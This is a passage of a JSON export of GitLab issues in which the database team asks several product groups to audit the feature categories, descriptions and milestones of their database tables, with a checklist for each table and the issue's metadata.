project_feature_usages\n  - [x] product_analytics is the correct feature category or has been updated\n  - [x] project_feature_usages description has been updated\n  - [x] project_feature_usages `milestone` and `introduced_by_url` seem accurate\n\n- [x] application_settings\n  - [x] service_ping is the correct feature category or has been updated\n  - [x] application_settings description has been updated https://gitlab.com/gitlab-org/gitlab/-/merge_requests/85311\n  - [x] application_settings `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:18:03.380Z","updated_at":"2022-05-12T19:46:54.325Z","closed_at":"2022-05-02T12:20:42.246Z","closed_by":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"labels":["Category:Database","Database tooling","backend","devops::growth","documentation","group::product intelligence","section::growth","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359358","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":20,"completed_count":20},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"20 of 20 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359358","notes":"https://gitlab.com/api/v4/projects/278964/issues/359358/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359358/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359358","relative":"#359358","full":"gitlab-org/gitlab#359358"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106711140,"iid":359349,"project_id":278964,"title":"Database Dictionary Audit for Configure:Configure","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [ ] project_auto_devops\n  - [x] auto_devops is the correct feature category or has been updated\n  - [x] project_auto_devops description has been updated\n  - [x] project_auto_devops `milestone` and `introduced_by_url` seem accurate\n\n- [ ] terraform_state_versions\n  - [x] infrastructure_as_code is the correct feature category or has been updated\n  - [x] terraform_state_versions description has been updated\n  - [x] terraform_state_versions `milestone` and `introduced_by_url` seem accurate\n\n- [ ] terraform_states\n  - [x] infrastructure_as_code is the correct feature category or has been updated\n  - [x] terraform_states description has been updated\n  - [x] terraform_states `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_agent_tokens\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_agent_tokens description has been updated\n  - [x] cluster_agent_tokens `milestone` and `introduced_by_url` seem accurate\n\n- [ ] agent_group_authorizations\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] agent_group_authorizations description has been updated\n  - [x] agent_group_authorizations `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_platforms_kubernetes\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_platforms_kubernetes description has been updated\n  - [x] cluster_platforms_kubernetes `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_groups\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_groups description has been updated\n  - [x] cluster_groups `milestone` and `introduced_by_url` seem accurate\n\n- [ ] agent_project_authorizations\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] agent_project_authorizations description has been updated\n  - [x] agent_project_authorizations `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_helm\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_helm description has been updated\n  - [x] clusters_applications_helm `milestone` and `introduced_by_url` seem accurate\n\n- [-] clusters_applications_cilium **Moved to `container_network_security`**\n  - [-] kubernetes_management is the correct feature category or has been updated\n  - [-] clusters_applications_cilium description has been updated\n  - [-] clusters_applications_cilium `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_jupyter\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_jupyter description has been updated\n  - [x] clusters_applications_jupyter `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_elastic_stacks\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_elastic_stacks description has been updated\n  - [x] clusters_applications_elastic_stacks `milestone` and `introduced_by_url` seem accurate\n\n- [ ] aws_roles\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] aws_roles description has been updated\n  - [x] aws_roles `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_cert_managers\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_cert_managers description has been updated\n  - [x] clusters_applications_cert_managers `milestone` and `introduced_by_url` seem accurate\n\n- [ ] agent_activity_events\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] agent_activity_events description has been updated\n  - [x] agent_activity_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_kubernetes_namespaces\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_kubernetes_namespaces description has been updated\n  - [x] clusters_kubernetes_namespaces `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_agents\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_agents description has been updated\n  - [x] cluster_agents `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_runners\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_runners description has been updated\n  - [x] clusters_applications_runners `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_projects\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_projects description has been updated\n  - [x] cluster_projects `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_ingress\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_ingress description has been updated\n  - [x] clusters_applications_ingress `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_providers_aws\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_providers_aws description has been updated\n  - [x] cluster_providers_aws `milestone` and `introduced_by_url` seem accurate\n\n- [ ] cluster_providers_gcp\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] cluster_providers_gcp description has been updated\n  - [x] cluster_providers_gcp `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_knative\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_knative description has been updated\n  - [x] clusters_applications_knative `milestone` and `introduced_by_url` seem accurate\n\n- [ ] clusters_applications_crossplane\n  - [x] kubernetes_management is the correct feature category or has been updated\n  - [x] clusters_applications_crossplane description has been updated\n  - [x] clusters_applications_crossplane `milestone` and `introduced_by_url` seem accurate\n\n- [ ] ci_pipeline_chat_data\n  - [x] chatops is the correct feature category or has been updated\n  - [x] ci_pipeline_chat_data description has been updated\n  - [x] ci_pipeline_chat_data `milestone` and `introduced_by_url` seem accurate\n\n- [ ] serverless_domain_cluster\n  - [x] deployment_management is the correct feature category or has been updated\n  - [x] serverless_domain_cluster description has been updated\n  - [x] serverless_domain_cluster `milestone` and `introduced_by_url` seem accurate\n\n- [ ] deployment_clusters\n  - [x] deployment_management is the correct feature category or has been updated\n  - [x] deployment_clusters description has been updated\n  - [x] deployment_clusters `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:17:50.769Z","updated_at":"2022-05-30T22:17:58.958Z","closed_at":"2022-05-30T22:17:58.191Z","closed_by":{"id":3167938,"username":"tigerwnz","name":"Tiger Watson","state":"active","avatar_url":"https://secure.gravatar.com/avatar/eb2c062f746fe8a57d693ee307942aa5?s=80\u0026d=identicon","web_url":"https://gitlab.com/tigerwnz"},"labels":["Category:Database","Database tooling","devops::configure","documentation","group::configure","section::ops","type::maintenance","workflow::production"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3167938,"username":"tigerwnz","name":"Tiger Watson","state":"active","avatar_url":"https://secure.gravatar.com/avatar/eb2c062f746fe8a57d693ee307942aa5?s=80\u0026d=identicon","web_url":"https://gitlab.com/tigerwnz"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":3167938,"username":"tigerwnz","name":"Tiger Watson","state":"active","avatar_url":"https://secure.gravatar.com/avatar/eb2c062f746fe8a57d693ee307942aa5?s=80\u0026d=identicon","web_url":"https://gitlab.com/tigerwnz"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359349","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":104,"completed_count":78},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"78 of 104 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359349","notes":"https://gitlab.com/api/v4/projects/278964/issues/359349/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359349/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359349","relative":"#359349","full":"gitlab-org/gitlab#359349"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106711135,"iid":359346,"project_id":278964,"title":"Database Dictionary Audit for Secure:Composition Analysis","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] software_license_policies\n  - [x] license_compliance is the correct feature category or has been updated\n  - [x] software_license_policies description has been updated\n  - [x] software_license_policies `milestone` and `introduced_by_url` seem accurate\n\n- [x] software_licenses\n  - [x] license_compliance is the correct feature category or has been updated\n  - [x] software_licenses description has been updated\n  - [x] software_licenses `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.\n\n### implementation plan\n\n- [ ] update description in \n  - [ ] https://gitlab.com/gitlab-org/gitlab/blob/master/db/docs/software_licenses.yml#L7\n  - [ ] https://gitlab.com/gitlab-org/gitlab/blob/master/db/docs/software_license_policies.yml#L7","state":"closed","created_at":"2022-04-15T21:17:46.859Z","updated_at":"2022-05-18T02:31:15.439Z","closed_at":"2022-05-18T02:31:12.279Z","closed_by":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"labels":["Category:Database","Database tooling","Enterprise Edition","GitLab Ultimate","backend","devops::secure","documentation","group::composition analysis","section::sec","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359346","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":11,"completed_count":8},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 11 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359346","notes":"https://gitlab.com/api/v4/projects/278964/issues/359346/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359346/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359346","relative":"#359346","full":"gitlab-org/gitlab#359346"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":106711122,"iid":359337,"project_id":278964,"title":"Database Dictionary Audit for Ecosystem:Integrations","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] integrations\n  - [x] integrations is the correct feature category or has been updated\n  - [x] integrations description has been updated\n  - [x] integrations `milestone` and `introduced_by_url` seem accurate\n\n- [x] clusters_integration_elasticstack\n  - [x] integrations is the correct feature category or has been updated\n  - [ ] clusters_integration_elasticstack description has been updated\n  - [x] clusters_integration_elasticstack `milestone` and `introduced_by_url` seem accurate\n\n- [x] web_hook_logs\n  - [x] integrations is the correct feature category or has been updated\n  - [x] web_hook_logs description has been updated\n  - [x] web_hook_logs `milestone` and `introduced_by_url` seem accurate\n\n- [x] application_settings\n  - [x] integrations is the correct feature category or has been updated\n  - [ ] application_settings description has been updated\n  - [ ] application_settings `milestone` and `introduced_by_url` seem accurate\n\n- [x] jira_tracker_data\n  - [x] integrations is the correct feature category or has been updated\n  - [x] jira_tracker_data description has been updated\n  - [x] jira_tracker_data `milestone` and `introduced_by_url` seem accurate\n\n- [x] operations_feature_flags\n  - [x] integrations is the correct feature category or has been updated\n  - [ ] operations_feature_flags description has been updated\n  - [x] operations_feature_flags `milestone` and `introduced_by_url` seem accurate\n\n- [x] issue_tracker_data\n  - [x] integrations is the correct feature category or has been updated\n  - [x] issue_tracker_data description has been updated\n  - [x] issue_tracker_data `milestone` and `introduced_by_url` seem accurate\n\n- [x] jira_connect_installations\n  - [x] integrations is the correct feature category or has been updated\n  - [x] jira_connect_installations description has been updated\n  - [x] jira_connect_installations `milestone` and `introduced_by_url` seem accurate\n\n- [x] slack_integrations\n  - [x] integrations is the correct feature category or has been updated\n  - [x] slack_integrations description has been updated\n  - [x] slack_integrations `milestone` and `introduced_by_url` seem accurate\n\n- [x] web_hooks\n  - [x] integrations is the correct feature category or has been updated\n  - [x] web_hooks description has been updated\n  - [x] web_hooks `milestone` and `introduced_by_url` seem accurate\n\n- [x] jira_connect_subscriptions\n  - [x] integrations is the correct feature category or has been updated\n  - [x] jira_connect_subscriptions description has been updated\n  - [x] jira_connect_subscriptions `milestone` and `introduced_by_url` seem accurate\n\n- [x] jira_imports\n  - [x] integrations is the correct feature category or has been updated\n  - [x] jira_imports description has been updated\n  - [x] jira_imports `milestone` and `introduced_by_url` seem accurate\n\n- [x] zentao_tracker_data\n  - [x] integrations is the correct feature category or has been updated\n  - [x] zentao_tracker_data description has been updated\n  - [x] zentao_tracker_data `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:17:35.717Z","updated_at":"2022-11-22T18:44:25.046Z","closed_at":"2022-04-20T09:27:47.722Z","closed_by":{"id":1315742,"username":"arturoherrero","name":"Arturo Herrero","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1315742/avatar.png","web_url":"https://gitlab.com/arturoherrero"},"labels":["Category:Database","Database tooling","devops::manage","documentation","group::integrations","maintenance::workflow","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1315742,"username":"arturoherrero","name":"Arturo Herrero","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1315742/avatar.png","web_url":"https://gitlab.com/arturoherrero"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":1315742,"username":"arturoherrero","name":"Arturo Herrero","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1315742/avatar.png","web_url":"https://gitlab.com/arturoherrero"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359337","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":52,"completed_count":48},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"48 of 52 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359337","notes":"https://gitlab.com/api/v4/projects/278964/issues/359337/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359337/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359337","relative":"#359337","full":"gitlab-org/gitlab#359337"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106711113,"iid":359333,"project_id":278964,"title":"Database Dictionary Audit for Create:Source Code","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] external_status_checks_protected_branches\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] external_status_checks_protected_branches description has been updated\n  - [x] external_status_checks_protected_branches `milestone` and `introduced_by_url` seem accurate\n\n- [x] fork_network_members\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] fork_network_members description has been updated\n  - [x] fork_network_members `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_repository_storage_moves\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_repository_storage_moves description has been updated\n  - [x] project_repository_storage_moves `milestone` and `introduced_by_url` seem accurate\n\n- [x] protected_branches\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] protected_branches description has been updated\n  - [x] protected_branches `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_project_rules_users\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_project_rules_users description has been updated\n  - [x] approval_project_rules_users `milestone` and `introduced_by_url` seem accurate\n\n- [x] external_status_checks\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] external_status_checks description has been updated\n  - [x] external_status_checks `milestone` and `introduced_by_url` seem accurate\n\n- [x] application_settings\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] application_settings description has been updated\n  - [x] application_settings `milestone` and `introduced_by_url` seem accurate\n\n- [x] trending_projects\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] trending_projects description has been updated\n  - [x] trending_projects `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_daily_statistics\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_daily_statistics description has been updated\n  - [x] project_daily_statistics `milestone` and `introduced_by_url` seem accurate\n\n- [x] diff_note_positions\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] diff_note_positions description has been updated\n  - [x] diff_note_positions `milestone` and `introduced_by_url` seem accurate\n\n- [x] namespace_aggregation_schedules\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] namespace_aggregation_schedules description has been updated\n  - [x] namespace_aggregation_schedules `milestone` and `introduced_by_url` seem accurate\n\n- [x] required_code_owners_sections\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] required_code_owners_sections description has been updated\n  - [x] required_code_owners_sections `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_repositories\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_repositories description has been updated\n  - [x] project_repositories `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_statistics\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_statistics description has been updated\n  - [x] project_statistics `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_project_rules\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_project_rules description has been updated\n  - [x] approval_project_rules `milestone` and `introduced_by_url` seem accurate\n\n- [x] content_blocked_states\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] content_blocked_states description has been updated\n  - [x] content_blocked_states `milestone` and `introduced_by_url` seem accurate\n\n- [x] approval_project_rules_protected_branches\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] approval_project_rules_protected_branches description has been updated\n  - [x] approval_project_rules_protected_branches `milestone` and `introduced_by_url` seem accurate\n\n- [x] gpg_key_subkeys\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] gpg_key_subkeys description has been updated\n  - [x] gpg_key_subkeys `milestone` and `introduced_by_url` seem accurate\n\n- [x] group_merge_request_approval_settings\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] group_merge_request_approval_settings description has been updated\n  - [x] group_merge_request_approval_settings `milestone` and `introduced_by_url` seem accurate\n\n- [x] project_aliases\n  - [x] source_code_management is the correct feature category or has been updated\n  - [x] project_aliases description has been updated\n  - [x] project_aliases `milestone` and `introduced_by_url` 